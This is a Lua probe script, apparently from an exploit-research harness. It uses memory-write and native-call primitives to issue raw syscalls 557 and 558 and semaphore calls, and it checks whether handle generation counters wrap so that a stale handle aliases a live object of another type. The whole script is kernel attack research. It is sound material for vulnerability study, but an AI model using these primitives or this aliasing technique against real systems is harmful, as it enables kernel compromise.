-- CRASH_CLASS: LOW
-- PROBE 96b: does a handle generation wrap far enough to alias a stale handle
--
-- 557d handed out handles for the same slot with an incrementing generation -
-- 0x2206, 0x4206, 0x6206, ... - one step per create/delete pair. If that field
-- is narrow it wraps, and a handle an attacker kept from an earlier generation
-- becomes equal to a live one. That matters only if the slot can then be
-- occupied by a different object family, because a stale handle would operate
-- on the new occupant.
--
-- Section A: repeat create/delete on one name and record the handle sequence,
--            looking for the first repeat.
-- Section B: with the wrap value known, keep the first handle and delete the
--            live object through it.
-- Section C: put a semaphore in the recycled slot and try the stale 557 handle
--            against it, and the current semaphore handle against 558.

print("=== PROBE 96b: handle generation wrap ===")

local function to_num(v)
    if type(v)=="table" then
        if v.tonumber then local n=v:tonumber() if n then return n end end
        if v.h then return v.h*4294967296+v.l end
    end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local function call(f,...) local ok,rv=pcall(f,...) if not ok then return -999 end return to_num(rv) end
local function pid() return to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20)) end

local create = mk(557)
local del    = mk(558)
local sem    = mk(549)
local sempost= mk(555)
local semtry = mk(554)

local name = memory.alloc(0x20); zero(name, 0x20)
local function setname(s)
    zero(name, 0x20)
    for i = 1, #s do wb(name + i - 1, string.byte(s, i)) end
end
setname("wrap")
print("[0] pid=" .. tostring(pid()))

print("")
print("--- A: 20 create/delete cycles on one name ---")
local seen = {}
local first = nil
local period = nil
for i = 1, 20 do
    local h = call(create, uint64(name), uint64(0), uint64(0), uint64(0))
    print(string.format("  %2d handle=%-8d slot=0x%X gen=%d", i, h, h % 0x2000, math.floor(h / 0x2000)))
    if first == nil then first = h end
    if seen[h] and period == nil then
        period = i - seen[h]
        print("  ^ repeat: this handle was issued at cycle " .. seen[h] .. ", period " .. period)
    end
    if seen[h] == nil then seen[h] = i end
    if h > 0 then call(del, uint64(h)) end
    if pid() == 0 then print("  [!] process died"); return end
end

print("")
print("--- B: keep the first handle and use it on a fresh object ---")
local stable = call(create, uint64(name), uint64(0), uint64(0), uint64(0))
print("  live handle=" .. stable .. "  stale(first)=" .. tostring(first))
if first and first == stable then
    print("  stale equals live: same numeric handle")
end
print("  delete via live handle  ret=" .. call(del, uint64(stable)))
print("  delete via first handle ret=" .. call(del, uint64(first)))
print("  alive=" .. tostring(pid()))

print("")
print("--- C: recycle the slot with a semaphore ---")
local s = call(sem, uint64(name), uint64(0), uint64(0), uint64(0))
print(string.format("  semaphore create ret=%d slot=0x%X gen=%d", s, s % 0x2000, math.floor(s / 0x2000)))
print("  558(semaphore handle)      ret=" .. call(del, uint64(s)))
print("  555(semaphore,0)           ret=" .. call(sempost, uint64(s), uint64(0)))
print("  554(semaphore)             ret=" .. call(semtry, uint64(s)))
if first then
    print("  558(stale 557 handle)      ret=" .. call(del, uint64(first)))
    print("  555(stale 557 handle,0)    ret=" .. call(sempost, uint64(first), uint64(0)))
end
print("  alive=" .. tostring(pid()))

print("")
print("--- D: wrap the semaphore generation and retry the stale numbers ---")
for i = 1, 12 do
    local x = call(sem, uint64(name), uint64(0), uint64(0), uint64(0))
    local g = (x - x % 0x2000) / 0x2000
    print(string.format("  %2d sem=%-8d slot=0x%X gen=%d", i, x, x % 0x2000, g))
    call(del, uint64(x))
    if pid() == 0 then print("  [!] process died"); return end
end

print("[Z] alive=" .. tostring(pid()))
print("=== PROBE 96b COMPLETE ===")
